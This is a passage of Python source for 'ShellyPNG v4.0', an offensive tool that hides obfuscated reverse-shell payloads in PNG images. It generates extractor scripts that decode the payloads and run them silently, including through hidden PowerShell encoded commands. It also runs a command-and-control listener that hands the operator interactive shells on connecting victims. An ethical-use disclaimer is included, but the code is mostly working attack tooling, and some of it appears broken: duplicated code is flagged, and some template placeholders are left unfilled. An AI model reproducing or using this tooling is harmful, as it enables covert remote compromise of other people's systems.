                    elif target_lang == 'powershell':
                         guidance += f'$B64="{payload_b64}" # Set the Base64 Variable\n'
                         self.last_payload_representation_for_extractor = '$B64' # Use the PS variable name
                         ps_deob_code, ps_final_var = self._build_deobfuscation_code(self.last_deobfuscation_steps, target_lang)
                         guidance += ps_deob_code + "\n"
                         guidance += f"Write-Output ${ps_final_var} | iex # Execute final code\n"
                    elif target_lang == 'python':
                         self.last_payload_representation_for_extractor = f'base64.b64decode(b"{payload_b64}")' # Start with decoded bytes
                         py_deob_code, py_final_var = self._build_deobfuscation_code(self.last_deobfuscation_steps, target_lang)
                         guidance += f"#!/usr/bin/env python3\n{py_deob_code}\n"
                         guidance += f"if {py_final_var}:\n    exec({py_final_var})\n"
                    else: # PHP, Perl, Ruby, NodeJS
                         guidance += f"# {target_lang.capitalize()} - Manual deobfuscation required for steps: {[(s['type']) for s in deobfuscation_steps]}\n"
                         guidance += f"# Example: php -r 'eval(deobfuscate(base64_decode($PAYLOAD_B64)));'\n"
                except Exception as build_e:
                    guidance += f"# Error generating deobfuscation code: {build_e}\n"
            guidance += "\n# Ensure required tools (base64, xxd, python3, etc.) are on the target for deobfuscation.\n"
            return True, guidance

        elif self.mode == 'stego':
            success = StegoEngine.embed(
                self.image_path, obfuscated_payload_bytes, self.output_path,
                self.bits_per_channel, self.use_alpha, self.verbose
            )
            if not success: return False, None
            self.log("Generating universal Python extraction script...", "info")
            extractor_filename = f"extract_{os.path.splitext(os.path.basename(self.output_path))[0]}_{self.instance_id}.py"
            try:
                # Build Python deobfuscation code for the extractor script
                # Pass the actual raw bytes representation for embedding
                self.last_payload_representation_for_extractor = repr(obfuscated_payload_bytes)
                deobfuscation_code, final_payload_var = self._build_deobfuscation_code(self.last_deobfuscation_steps, target_lang='python')

                # Determine target execution language and logic
                target_exec_lang = 'powershell' if 'powershell' in self.payload_type else \
                           'bash' if any(sh in self.payload_type for sh in ['bash', 'nc']) else \
                           'python' if 'python' in self.payload_type else \
                           'php' if 'php' in self.payload_type else \
                           'perl' if 'perl' in self.payload_type else \
                           'ruby' if 'ruby' in self.payload_type else \
                           'nodejs' if 'nodejs' in self.payload_type else 'unknown'
                execution_logic = self._get_python_execution_logic(target_exec_lang, final_payload_var)

                # Assemble the extractor script template
                extractor_template = self._get_extractor_template()
                indented_deob_code = "\n".join("    " + line for line in deobfuscation_code.splitlines())
                indented_exec_logic = "\n".join("    " + line for line in execution_logic.splitlines())

                script_content = extractor_template.format(
                    output_image_name=os.path.basename(self.output_path),
                    bits_per_channel=self.bits_per_channel,
                    use_alpha=self.use_alpha,
                    eom_marker=repr(StegoEngine.END_OF_MESSAGE_MARKER),
                    obfuscation_level=self.obfuscation_level,
                    embedded_bytes_repr=self.last_payload_representation_for_extractor, # Embed the raw bytes
                    deobfuscation_code_placeholder=indented_deob_code,
                    execution_logic_placeholder=indented_exec_logic,
                    final_payload_var=final_payload_var # Pass the variable name
                )

                with open(extractor_filename, "w", encoding='utf-8') as f:
                    f.write(script_content)
                self.log(f"Python extraction/execution script saved: {extractor_filename}", "success")
                try: os.chmod(extractor_filename, 0o755)
                except OSError: pass
                final_command = f"python3 ./{extractor_filename}"
                return True, final_command

            except Exception as e:
                self.log(f"Failed to generate Python extractor script: {e}", "error")
                import traceback; traceback.print_exc() # More debug info
                return False, f"# Error generating extractor script: {e}"


    def _get_python_execution_logic(self, target_lang, final_var):
        """Generates the Python code snippet to execute the final payload."""
        if target_lang == 'python':
            return f"""
print(f"{{Fore.GREEN}}[*] Executing final Python payload...{{Style.RESET_ALL}}")
try:
    # WARNING: exec is dangerous! Use with extreme caution.
    final_code = {final_var} if isinstance({final_var}, str) else {final_var}.decode('utf-8','ignore')
    exec(final_code)
except Exception as exec_e:
    print(f"{{Fore.RED}}[X] Python execution failed: {{exec_e}}{{Style.RESET_ALL}}", file=sys.stderr)
"""
        elif target_lang in ['bash', 'perl', 'php', 'ruby', 'nodejs']:
            interpreter_map = {'bash': '/bin/bash', 'perl': 'perl', 'php': 'php', 'ruby': 'ruby', 'nodejs': 'node'}
            interpreter = interpreter_map.get(target_lang, '/bin/bash') # Default to bash
            return f"""
print(f"{{Fore.GREEN}}[*] Executing final {target_lang.capitalize()} payload via subprocess...{{Style.RESET_ALL}}")
import subprocess
try:
    payload_to_run = {final_var} if isinstance({final_var}, str) else {final_var}.decode('utf-8', 'ignore')
    print(f"{{Fore.YELLOW}}--- Payload ---{{Style.RESET_ALL}}\\n{{payload_to_run}}\\n{{Fore.YELLOW}}---------------{{Style.RESET_ALL}}")
    # Use Popen for non-blocking execution typical of shells
    proc = subprocess.Popen(payload_to_run, shell=True, executable='{interpreter}', text=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    print(f"{{Fore.GREEN}}[*] {target_lang.capitalize()} process launched (PID: {{proc.pid}}).{{Style.RESET_ALL}}")
except Exception as exec_e:
    print(f"{{Fore.RED}}[X] {target_lang.capitalize()} execution failed: {{exec_e}}{{Style.RESET_ALL}}", file=sys.stderr)
    print(f"{{Fore.YELLOW}}Payload content was:\\n{{{final_var}}}{{Style.RESET_ALL}}", file=sys.stderr)
"""
        elif target_lang == 'powershell':
            return f"""
print(f"{{Fore.GREEN}}[*] Executing final PowerShell payload via subprocess...{{Style.RESET_ALL}}")
import subprocess, base64
try:
    ps_command = {final_var} if isinstance({final_var}, str) else {final_var}.decode('utf-8', 'ignore')
    ps_script_bytes = ps_command.encode('utf-16le')
    encoded_ps = base64.b64encode(ps_script_bytes).decode('utf-8')
    # Command for Windows. Adapt for pwsh on Linux/Mac if needed.
    full_command = ['powershell.exe', '-NoProfile', '-NonInteractive', '-WindowStyle', 'Hidden', '-EncodedCommand', encoded_ps]
    print(f"{{Fore.YELLOW}}[DBG] Running PS EncodedCommand (first 80 chars): {{encoded_ps[:80]}}...{{Style.RESET_ALL}}")
    proc = subprocess.Popen(full_command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    print(f"{{Fore.GREEN}}[*] PowerShell process launched (PID: {{proc.pid}}).{{Style.RESET_ALL}}")
except FileNotFoundError:
     print(f"{{Fore.RED}}[X] 'powershell.exe' not found. Cannot execute PowerShell payload directly.{{Style.RESET_ALL}}", file=sys.stderr)
except Exception as exec_e:
    print(f"{{Fore.RED}}[X] PowerShell execution failed: {{exec_e}}{{Style.RESET_ALL}}", file=sys.stderr)
"""
        else: # Unknown
            return f"print(f'{{Fore.YELLOW}}[!] Unknown target execution language. Final payload (type: {{type({final_var})}}):\\n{{{final_var}}}{{Style.RESET_ALL}}')"

    def _get_extractor_template(self):
         """Returns the template for the standalone Python extractor script."""
         # This template now assumes the StegoEngine.extract logic is embedded within it
         return """#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# ShellyPNG v4.0 - Universal Python Extractor/Executor
# Generated: {generation_timestamp}

import base64, zlib, sys, os, codecs, time, random, socket, ssl, threading, argparse
from io import BytesIO

# --- Optional Dependencies ---
try:
    from PIL import Image
    HAS_PIL = True
except ImportError:
    HAS_PIL = False
    print("[X] ERROR: Python Imaging Library (Pillow) not found.", file=sys.stderr)
    print("       Please install it: python3 -m pip install Pillow", file=sys.stderr)
    # Allow continuing if only deobfuscation of provided data is needed
    # sys.exit(1)

try:
    from colorama import init, Fore, Style, Back
    init(autoreset=True)
    HAS_COLORAMA = True
except ImportError:
    HAS_COLORAMA = False
    class DummyColorama:
        def __getattr__(self, name): return ""
    Fore = Style = Back = DummyColorama()

# --- Config (Embedded from Generator) ---
DEFAULT_IMAGE_PATH = '{output_image_name}'
BITS_PER_CHANNEL = {bits_per_channel}
USE_ALPHA = {use_alpha}
EOM_MARKER = {eom_marker}
OBFUSCATION_LEVEL = {obfuscation_level}

# --- StegoEngine Extract Logic (Embedded) ---
PAYLOAD_SIZE_HOLDER = -1 # Module level var to track status

def extract_lsb(image_path, bits_per_channel, use_alpha):
    global PAYLOAD_SIZE_HOLDER
    if not HAS_PIL:
        print(f"{{Fore.RED}}[X] Cannot extract from image: Pillow library is missing.{{Style.RESET_ALL}}", file=sys.stderr)
        return None

    print(f"{{Fore.BLUE}}[*]{{Style.RESET_ALL}} Loading spectral image: {{image_path}}")
    try: img = Image.open(image_path)
    except FileNotFoundError: print(f"{{Fore.RED}}[X]{{Style.RESET_ALL}} Image file not found: {{image_path}}", file=sys.stderr); return None
    except Exception as e: print(f"{{Fore.RED}}[X]{{Style.RESET_ALL}} Error loading image {{image_path}}: {{e}}", file=sys.stderr); return None

    img_mode = img.mode; channels = len(img.getbands())
    target_mode = "RGBA" if use_alpha and 'A' in img.getbands() else "RGB"

    # Perform conversion only if necessary and possible
    converted = False
    if img.mode != target_mode and not (target_mode == "RGB" and img.mode == "RGBA"):
         try:
             img = img.convert(target_mode);
             print(f"{{Fore.MAGENTA}}[D]{{Style.RESET_ALL}} Normalized image mode to {{target_mode}}")
             channels = len(img.getbands()); converted = True
         except Exception as conv_e: print(f"{{Fore.RED}}[X]{{Style.RESET_ALL}} Cannot convert image to {{target_mode}}: {{conv_e}}", file=sys.stderr); return None
    elif target_mode == "RGB" and img.mode == "RGBA":
         channels = 3 # Adjust channel count if ignoring existing Alpha

    pixels = img.load(); width, height = img.size
    print(f"{{Fore.BLUE}}[*]{{Style.RESET_ALL}} Extracting shadows (BPC: {{bits_per_channel}}, Alpha: {{use_alpha}}, Mode: {{img.mode}}{{', Converted' if converted else ''}})")
    mask = (1 << bits_per_channel) - 1
    extracted_bits = ""; payload_size = -1; extracted_data = bytearray(); bits_needed_for_size = 32

    total_bits_to_process = width * height * channels * bits_per_channel
    print(f"{{Fore.MAGENTA}}[D]{{Style.RESET_ALL}} Image dimensions: {{width}}x{{height}}, Total bits to scan: ~{{total_bits_to_process}}")

    extracted_bit_count = 0
    try:
        # Optimization: Read size first more efficiently if possible
        size_header_bits = ""
        pixel_count = 0
        bits_per_pixel = channels * bits_per_channel
        pixels_for_header = (bits_needed_for_size + bits_per_pixel -1) // bits_per_pixel + 1 # Calculate pixels needed for header + buffer

        for y in range(height):
             for x in range(width):
                 pixel_list = pixels[x, y]
                 for c in range(channels):
                     channel_value = pixel_list[c]
                     extracted_lsbs = channel_value & mask
                     extracted_bits += format(extracted_lsbs, f'0{{bits_per_channel}}b')
                     extracted_bit_count += bits_per_channel

                     # --- Size Header Extraction ---
                     if payload_size == -1 and len(extracted_bits) >= bits_needed_for_size:
                         size_bits = extracted_bits[:bits_needed_for_size]
                         size_bytes_list = [int(size_bits[i:i+8], 2) for i in range(0, bits_needed_for_size, 8)]
                         try: payload_size = int.from_bytes(bytes(size_bytes_list), byteorder='big')
                         except Exception as int_e: print(f"{{Fore.RED}}[X]{{Style.RESET_ALL}} Error converting size bytes: {{int_e}}", file=sys.stderr); payload_size = -2
                         PAYLOAD_SIZE_HOLDER = payload_size
                         # Sanity check size
                         max_possible_payload = (width * height * channels * bits_per_channel // 8) - 4 - len(EOM_MARKER)
                         if payload_size < 0 or payload_size > max_possible_payload + 1000: # Allow some buffer
                              print(f"{{Fore.RED}}[X]{{Style.RESET_ALL}} Implausible payload size extracted: {{payload_size}} (Max ~{{max_possible_payload}}). Aborting.", file=sys.stderr); return None
                         print(f"{{Fore.MAGENTA}}[D]{{Style.RESET_ALL}} Payload size marker found: {{payload_size}} bytes (extracted at bit ~{{extracted_bit_count}})")
                         extracted_bits = extracted_bits[bits_needed_for_size:] # Consume size bits

                     # --- Data Byte Extraction ---
                     if payload_size != -1:
                         while len(extracted_bits) >= 8:
                             byte_str = extracted_bits[:8]
                             extracted_data.append(int(byte_str, 2))
                             extracted_bits = extracted_bits[8:] # Consume byte bits

                             # --- EOM Marker Check ---
                             if len(extracted_data) == payload_size: # Check only when expected payload length is reached
                                 # Need to extract EOM marker bits next
                                 pass
                             if len(extracted_data) >= payload_size + len(EOM_MARKER):
                                 if extracted_data[payload_size : payload_size + len(EOM_MARKER)] == EOM_MARKER:
                                     print(f"{{Fore.MAGENTA}}[D]{{Style.RESET_ALL}} End-Of-Message sequence found at byte {{len(extracted_data)}}.")
                                     actual_payload = bytes(extracted_data[:payload_size])
                                     print(f"{{Fore.GREEN}}[+]{{Style.RESET_ALL}} Successfully extracted {{len(actual_payload)}} shadow bytes.")
                                     return actual_payload # Success

                 # Early exit if EOM found
                 if PAYLOAD_SIZE_HOLDER != -1 and len(extracted_data) >= PAYLOAD_SIZE_HOLDER + len(EOM_MARKER):
                      # Check if EOM was found in the inner loop
                      if bytes(extracted_data[PAYLOAD_SIZE_HOLDER : PAYLOAD_SIZE_HOLDER + len(EOM_MARKER)]) == EOM_MARKER:
                          print(f"{{Fore.MAGENTA}}[D]{{Style.RESET_ALL}} Breaking outer loops after EOM confirmed.")
                          return bytes(extracted_data[:PAYLOAD_SIZE_HOLDER]) # Return data already extracted

            # If loop finishes without finding EOM marker after extracting payload_size bytes
            if payload_size != -1 and len(extracted_data) >= payload_size:
                 print(f"{{Fore.YELLOW}}[!] Warning: Extracted expected payload size ({{payload_size}} bytes), but EOM sequence not found immediately after. Data might be truncated or corrupted.{{Style.RESET_ALL}}", file=sys.stderr)
                 return bytes(extracted_data[:payload_size]) # Return what we have up to payload_size

    except Exception as e: print(f"{{Fore.RED}}[X]{{Style.RESET_ALL}} Error during extraction loop: {{type(e).__name__}} {{e}}", file=sys.stderr); return None

    # If loops finish without ever finding the size or reaching EOM
    print(f"{{Fore.RED}}[X]{{Style.RESET_ALL}} Extraction failed. Size header (found: {{PAYLOAD_SIZE_HOLDER}}) or EOM sequence not found.", file=sys.stderr)
    return None


# --- Main Execution Logic ---
def run_extraction(image_path):
    final_payload_bytes = extract_lsb(image_path, BITS_PER_CHANNEL, USE_ALPHA)
    final_payload_code = None

    if final_payload_bytes is not None:
        print(f"{{Fore.CYAN}}[*] Starting Deobfuscation (Level {{OBFUSCATION_LEVEL}})...{{Style.RESET_ALL}}")
        try:
            # --- Deobfuscation Code Placeholder ---
            # This block will be replaced by the generator
            # It expects 'final_payload_bytes' as input and sets '{final_payload_var}'
{deobfuscation_code_placeholder}
            # --- End Deobfuscation ---
            print(f"{{Fore.GREEN}}[+]{{Style.RESET_ALL}} Deobfuscation successful.")
        except Exception as deob_e:
            print(f"{{Fore.RED}}[X] Deobfuscation Error: {{deob_e}}{{Style.RESET_ALL}}", file=sys.stderr)
            {final_payload_var} = None # Ensure None on failure
    else:
        print(f"{{Fore.RED}}[X] Failed to extract payload bytes from image.{{Style.RESET_ALL}}", file=sys.stderr)
        {final_payload_var} = None

    if {final_payload_var} is not None:
        delay = random.uniform(0.5, 1.5)
        print(f"{{Fore.YELLOW}}[!] Waiting for {{delay:.1f}}s before unleashing...{{Style.RESET_ALL}}")
        time.sleep(delay)
        # --- Execution Logic Placeholder ---
{execution_logic_placeholder}
        # --- End Execution ---
    else:
        print(f"{{Fore.RED}}[X] Deobfuscation or Extraction failed, cannot execute.{{Style.RESET_ALL}}", file=sys.stderr)
        sys.exit(1)

def run_deobfuscate_only(input_b64):
    print(f"{{Fore.CYAN}}[*] Deobfuscating provided Base64 data (Level {{OBFUSCATION_LEVEL}})...{{Style.RESET_ALL}}")
    try:
        final_payload_bytes = base64.b64decode(input_b64.encode('utf-8'))
        print(f"{{Fore.MAGENTA}}[D]{{Style.RESET_ALL}} Decoded Base64 input (len: {{len(final_payload_bytes)}})")

        # --- Deobfuscation Code Placeholder ---
        # This block will be replaced by the generator
        # It expects 'final_payload_bytes' as input and sets '{final_payload_var}'
{deobfuscation_code_placeholder}
        # --- End Deobfuscation ---
        print(f"{{Fore.GREEN}}[+]{{Style.RESET_ALL}} Deobfuscation successful.")

        if {final_payload_var} is not None:
            print(f"{{Fore.CYAN}}--- Final Deobfuscated Payload ---{{Style.RESET_ALL}}")
            # Try to print as string, fall back to bytes repr
            try:
                 print({final_payload_var} if isinstance({final_payload_var}, str) else {final_payload_var}.decode('utf-8', 'ignore'))
            except Exception:
                 print(repr({final_payload_var}))
            print(f"{{Fore.CYAN}}----------------------------------{{Style.RESET_ALL}}")
        else:
            print(f"{{Fore.RED}}[X] Deobfuscation failed internally.{{Style.RESET_ALL}}", file=sys.stderr)

    except Exception as e:
        print(f"{{Fore.RED}}[X] Error during deobfuscation: {{e}}{{Style.RESET_ALL}}", file=sys.stderr)
        sys.exit(1)


if __name__ == "__main__":
    print(f"{{Style.BRIGHT}}--- ShellyPNG v4.0 Extractor ---{{Style.RESET_ALL}}")
    parser = argparse.ArgumentParser(description="ShellyPNG v4.0 Extractor/Executor")
    parser.add_argument('-i', '--image', default=DEFAULT_IMAGE_PATH, help=f"Path to the stego image (default: {{DEFAULT_IMAGE_PATH}})")
    parser.add_argument('-d', '--deobfuscate', default=None, help="Deobfuscate provided Base64 payload directly (ignores image)")
    parser.add_argument('-n', '--no-exec', action='store_true', help="Extract and deobfuscate, but do not execute the final payload.")

    args = parser.parse_args()

    if args.deobfuscate:
        run_deobfuscate_only(args.deobfuscate)
    elif args.no_exec:
        print(f"{{Fore.YELLOW}}[!] No-Execute mode: Payload will be extracted and deobfuscated only.{{Style.RESET_ALL}}")
        final_payload_bytes = extract_lsb(args.image, BITS_PER_CHANNEL, USE_ALPHA)
        if final_payload_bytes:
             print(f"{{Fore.CYAN}}[*] Starting Deobfuscation (Level {{OBFUSCATION_LEVEL}})...{{Style.RESET_ALL}}")
             try:
                # --- Deobfuscation Code Placeholder (Read Only) ---
{deobfuscation_code_placeholder}
                # --- End Deobfuscation ---
                print(f"{{Fore.GREEN}}[+]{{Style.RESET_ALL}} Deobfuscation successful.")
                print(f"{{Fore.CYAN}}--- Final Deobfuscated Payload (Not Executed) ---{{Style.RESET_ALL}}")
                try:
                     print({final_payload_var} if isinstance({final_payload_var}, str) else {final_payload_var}.decode('utf-8', 'ignore'))
                except Exception:
                     print(repr({final_payload_var}))
                print(f"{{Fore.CYAN}}----------------------------------------------{{Style.RESET_ALL}}")
             except Exception as deob_e:
                 print(f"{{Fore.RED}}[X] Deobfuscation Error: {{deob_e}}{{Style.RESET_ALL}}", file=sys.stderr)
        else:
             print(f"{{Fore.RED}}[X] Failed to extract payload bytes from image.{{Style.RESET_ALL}}", file=sys.stderr)
             sys.exit(1)
    else:
        run_extraction(args.image)

""".format(
             generation_timestamp=time.ctime(),
             output_image_name="{output_image_name}",
             bits_per_channel="{bits_per_channel}",
             use_alpha="{use_alpha}",
             eom_marker="{eom_marker}",
             obfuscation_level="{obfuscation_level}",
             embedded_bytes_repr="{embedded_bytes_repr}", # Placeholder for raw bytes
             deobfuscation_code_placeholder="{deobfuscation_code_placeholder}",
             execution_logic_placeholder="{execution_logic_placeholder}",
             final_payload_var="{final_payload_var}" # Placeholder for final variable name
         )


    # --- C2 Server (Unchanged) ---
    def start_c2_server(self):
        # ... (C2 Server logic - same as previous version) ...
         self.log(f"Starting C2 server on {self.listen_host}:{self.c2_port}...", "info")
         try:
             server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
             server_socket.bind((self.listen_host, self.c2_port))
             server_socket.listen(5)
             self.log(f"{Fore.RED}<<< C2 Server ACTIVE on {self.listen_host}:{self.c2_port} >>>{Style.RESET_ALL}", "success")
             self.log(f"Awaiting connection from target -> {self.c2_host}:{self.c2_port}", "info")
             self.log("Press Ctrl+C to silence the listener.", "info")
             while True:
                 client_socket, addr = server_socket.accept()
                 self.log(f"Incoming shadow from {addr[0]}:{addr[1]}...", "success")
                 client_thread = threading.Thread(target=self.handle_client, args=(client_socket, addr), daemon=True)
                 client_thread.start()
         except OSError as e:
             if e.errno == 98: self.log(f"Port {self.c2_port} is already bound.", "error")
             else: self.log(f"C2 Server socket error: {e}", "error")
         except KeyboardInterrupt: self.log("\nCtrl+C detected. Silencing C2 server...", "warning")
         except Exception as e: self.log(f"C2 Server failure: {e}", "error")
         finally:
             if 'server_socket' in locals(): server_socket.close()
             self.log("C2 Server stopped.", "info")

    def handle_client(self, client_conn, addr):
        # ... (handle_client logic - same improved version as previous) ...
        client_ip = addr[0]
        prompt_color = random.choice([Fore.RED, Fore.MAGENTA, Fore.YELLOW, Fore.CYAN, Fore.LIGHTRED_EX])
        prompt = f"{prompt_color}[{client_ip}]$ {Style.RESET_ALL}"
        self.log(f"Handler engaged for {client_ip}", "debug")
        try:
            client_stream = client_conn.makefile('rw', encoding='utf-8', errors='replace')
            time.sleep(0.5); initial_output = ""; client_conn.settimeout(1.5)
            try: # Read initial connection data / prompt
                while True:
                    line = client_stream.readline()
                    if not line: break
                    if line.strip().endswith(('> ', '$ ', '# ')): initial_output += line; prompt = f"{prompt_color}{line.strip()}{Style.RESET_ALL} "; break
                    initial_output += line
            except socket.timeout:
                pass
            finally:
                client_conn.settimeout(None)
            
            # This code appears to be duplicated and has indentation errors
            if initial_output:
                print(f"\n{Style.BRIGHT}{Fore.RED}--- Shadow Connected [{client_ip}] ---{Style.RESET_ALL}")
                print(f"{Fore.LIGHTMAGENTA_EX}{initial_output.strip()}{Style.RESET_ALL}")
                print(f"{Style.BRIGHT}{Fore.RED}--- End Initial Output ---{Style.RESET_ALL}")

            while True: # Interactive loop
                try:
                    cmd = input(prompt)
                    if cmd.lower().strip() in ["exit", "quit", "bye", ":q"]: client_stream.write("exit\\n"); client_stream.flush(); break
                    if not cmd.strip(): client_stream.write("\\n"); client_stream.flush(); response = client_stream.readline(); continue
                    client_stream.write(cmd + "\\n"); client_stream.flush()
                    response_buffer = ""; client_conn.settimeout(5.0)
                    try: # Read response until next prompt or timeout
                         while True:
                             line = client_stream.readline()
                             if not line: self.log(f"Connection terminated by {client_ip}", "warning"); raise ConnectionAbortedError
                             response_buffer += line
                             if line.strip().endswith(('> ', '$ ', '# ')): prompt = f"{prompt_color}{line.strip()}{Style.RESET_ALL} "; response_to_print = response_buffer[:-len(line)]; print(response_to_print.strip()); break
                    except socket.timeout: print(response_buffer.strip()); self.log(f"Timeout from {client_ip}", "debug")
                    except UnicodeDecodeError as ude: self.log(f"Encoding err from {client_ip}: {ude}", "warning"); print(f"{Fore.RED}--- Non-UTF8 Data ---{Style.RESET_ALL}\n{response_buffer}\n--- End ---");
                    client_conn.settimeout(None)
                except (EOFError, KeyboardInterrupt):
                    confirm = input(f"{Fore.YELLOW}Terminate session with {client_ip}? (y/n): {Style.RESET_ALL}")
                    if confirm.lower() == 'y':
                        try:
                            client_stream.write("exit\n")
                            client_stream.flush()
                        except:
                            pass
                        break
                    else:
                        continue
                except (ConnectionAbortedError, ConnectionResetError, BrokenPipeError) as conn_err:
                    self.log(f"Connection error with {client_ip}: {conn_err}", "error")
                    break
                except Exception as e:
                    self.log(f"Error handling {client_ip}: {e}", "error")
                    break
        except Exception as e:
            self.log(f"Major error handling client {addr}: {e}", "error")
        finally: self.log(f"Closing shadow connection with {addr[0]}.", "warning"); client_conn.close()

# --- UI and Main Logic ---
def print_disclaimer(quiet=False):
    # ... (Disclaimer - same as previous, strong warning) ...
    if quiet or os.getenv('SHELLYPNG_I_AGREE'): return True
    disclaimer = f"""
{Back.RED}{Fore.WHITE}{Style.BRIGHT}<<< WARNING: ETHICAL USE MANDATORY >>>{Style.RESET_ALL}

ShellyPng ({Fore.RED}v4.0 - Matrin Rain Shadow Shell{Style.RESET_ALL}) is intended for authorized security research,
penetration testing in controlled environments, and educational purposes ONLY.

{Fore.RED}{Style.BRIGHT}🔥 UNAUTHORIZED USE IS ILLEGAL AND HARMFUL. 🔥{Style.RESET_ALL}
Do not use this tool on any system or network you do not have explicit,
written permission to test. You are solely responsible for your actions.

The authors & contributors assume NO liability for misuse or damage.
"""
    print(disclaimer)
    try:
        if inquirer:
             questions = [inquirer.Confirm('agree', message=f"{Fore.CYAN}Acknowledge and agree to ethical use?", default=False)]
             answers = inquirer.prompt(questions)
             if not answers or not answers['agree']: print(f"{Fore.RED}Exiting. Agreement required.{Style.RESET_ALL}"); return False
        else:
             response = input(f"{Fore.CYAN}Acknowledge and agree? (yes/no): {Style.RESET_ALL}")
             if response.lower() not in ['y', 'yes']: print(f"{Fore.RED}Exiting. Agreement required.{Style.RESET_ALL}"); return False
    except KeyboardInterrupt: print(f"\n{Fore.RED}Exit.{Style.RESET_ALL}"); return False
    except Exception as e: print(f"\n{Fore.RED}Error during confirmation: {e}. Exiting.{Style.RESET_ALL}"); return False
    print(f"{Fore.GREEN}Agreement acknowledged. Unleash responsibly.{Style.RESET_ALL}\n")
    return True

def get_input(prompt, default="", color=Fore.RED): # Darker default prompt color
    try:
        value = input(f"{color}[?] {Style.BRIGHT}{prompt}{Style.RESET_ALL} [{default}]: ")
        return value if value else default
    except KeyboardInterrupt: print(f"\n{Fore.RED}Operation cancelled.{Style.RESET_ALL}"); sys.exit(0)

def interactive_mode(use_inquirer=True):
    # ... (Interactive mode - same structure, add new payload choices) ...
    if use_inquirer and not inquirer:
        print(f"{Fore.YELLOW}[!] Inquirer not found, using basic prompts.{Style.RESET_ALL}")
        use_inquirer = False

    animate_matrin_rain_banner()
    if not print_disclaimer(): sys.exit(1)

    payload_choices = [ # Added new shells
        "python_reverse_tcp", "powershell_reverse_tcp", "bash_reverse_tcp",
        "bash_mkfifo", "php_reverse_tcp", "perl_reverse_tcp",
        "nc_reverse_tcp", "nc_mkfifo", "ruby_reverse_tcp", "nodejs_reverse_tcp"
    ]
    obfuscation_levels = { "0: None": 0, "1: Basic (Random)": 1, "2: Advanced (Layered)": 2 }
    modes = { "Stego: Embed in Image": 'stego', "Generate Shell Only": 'generate_only' }
    shelly = None

    try:
        if use_inquirer:
             # ... (Inquirer questions - add new payload types) ...
              questions = [
                 inquirer.List('mode_desc', message="Select Mode", choices=list(modes.keys()), default="Stego: Embed in Image"),
                 inquirer.Text('c2_host', message="C2 Callback Host/IP", default=DEFAULT_C2_HOST),
                 inquirer.Text('c2_port', message="C2 Callback Port", default=str(DEFAULT_C2_PORT), validate=lambda _, x: x.isdigit()),
                 inquirer.Path('image_path', message="Input image for steganography", default=DEFAULT_IMAGE, exists=None, ignore=lambda x: modes[x['mode_desc']] == 'generate_only'),
                 inquirer.Text('output_path', message="Output stego image path", default=DEFAULT_OUTPUT, ignore=lambda x: modes[x['mode_desc']] == 'generate_only'),
                 inquirer.List('payload_type', message="Select Payload Type", choices=payload_choices, default=DEFAULT_PAYLOAD_TYPE),
                 inquirer.List('obfuscation_level_desc', message="Select Obfuscation Level", choices=list(obfuscation_levels.keys()), default="1: Basic (Random)"),
                 inquirer.Text('bits_per_channel', message="LSB Bits Per Channel (1-8)", default=str(DEFAULT_BITS_PER_CHANNEL), validate=lambda _, x: x.isdigit() and 1 <= int(x) <= 8, ignore=lambda x: modes[x['mode_desc']] == 'generate_only'),
                 inquirer.Confirm('use_alpha', message="Use Alpha channel (if available)?", default=False, ignore=lambda x: modes[x['mode_desc']] == 'generate_only'),
                 inquirer.Confirm('verbose', message="Enable verbose output?", default=False),
                 inquirer.Confirm('start_server', message="Start C2 listener now?", default=lambda x: 'tcp' in x.get('payload_type','') or 'nc' in x.get('payload_type','')),
                 inquirer.Text('listen_host', message="C2 Listen Address", default="0.0.0.0", ignore=lambda x: not x.get('start_server')),
             ]
              answers = inquirer.prompt(questions)
              if not answers: raise KeyboardInterrupt
              # Extract answers
              mode = modes[answers['mode_desc']]
              c2_port = int(answers['c2_port'] or DEFAULT_C2_PORT)
              bits_per_channel = int(answers.get('bits_per_channel') or DEFAULT_BITS_PER_CHANNEL)
              obfuscation_level = obfuscation_levels[answers['obfuscation_level_desc']]
              listen_host = answers.get('listen_host', "0.0.0.0")
              start_server = answers.get('start_server', False)
              # Create ShellyPng instance
              shelly = ShellyPng(
                 c2_host=answers.get('c2_host') or DEFAULT_C2_HOST, c2_port=c2_port,
                 image_path=answers.get('image_path'), output_path=answers.get('output_path'),
                 payload_type=answers['payload_type'], obfuscation_level=obfuscation_level,
                 bits_per_channel=bits_per_channel, use_alpha=answers.get('use_alpha', False),
                 listen_host=listen_host, mode=mode, verbose=answers['verbose'], quiet=False
             )

        else: # Basic input fallback
            # ... (Basic input prompts - add new payload types) ...
            mode_choice = get_input(f"Select Mode (1=Stego, 2=Generate Only)", "1")
            mode = 'generate_only' if mode_choice == '2' else 'stego'
            c2_host = get_input("C2 Callback Host/IP", DEFAULT_C2_HOST)
            c2_port_str = get_input("C2 Callback Port", str(DEFAULT_C2_PORT))
            c2_port = int(c2_port_str) if c2_port_str.isdigit() else DEFAULT_C2_PORT
            image_path = get_input("Input image path", DEFAULT_IMAGE) if mode == 'stego' else None
            output_path = get_input("Output image path", DEFAULT_OUTPUT) if mode == 'stego' else None
            print(f"{Fore.CYAN}Payload Types:{Style.RESET_ALL} " + ", ".join(f"{i+1}={p}" for i, p in enumerate(payload_choices)))
            pt_choice = get_input(f"Select Payload Type (1-{len(payload_choices)})", "1")
            payload_type = payload_choices[int(pt_choice)-1] if pt_choice.isdigit() and 0<int(pt_choice)<=len(payload_choices) else DEFAULT_PAYLOAD_TYPE
            ob_choice = get_input(f"Obfuscation Level (0-2)", str(DEFAULT_OBFUSCATION_LEVEL))
            obfuscation_level = int(ob_choice) if ob_choice.isdigit() and 0<=int(ob_choice)<=2 else DEFAULT_OBFUSCATION_LEVEL
            bits_str = get_input("LSB Bits (1-8)", str(DEFAULT_BITS_PER_CHANNEL)) if mode == 'stego' else '1'
            bits_per_channel = int(bits_str) if bits_str.isdigit() and 1<=int(bits_str)<=8 else DEFAULT_BITS_PER_CHANNEL
            alpha_str = get_input("Use Alpha? (y/n)", "n") if mode == 'stego' else 'n'
            use_alpha = alpha_str.lower() == 'y'
            verb_str = get_input("Verbose output? (y/n)", "n")
            verbose = verb_str.lower() == 'y'
            srv_str = get_input("Start C2 listener? (y/n)", "y")
            start_server = srv_str.lower() == 'y'
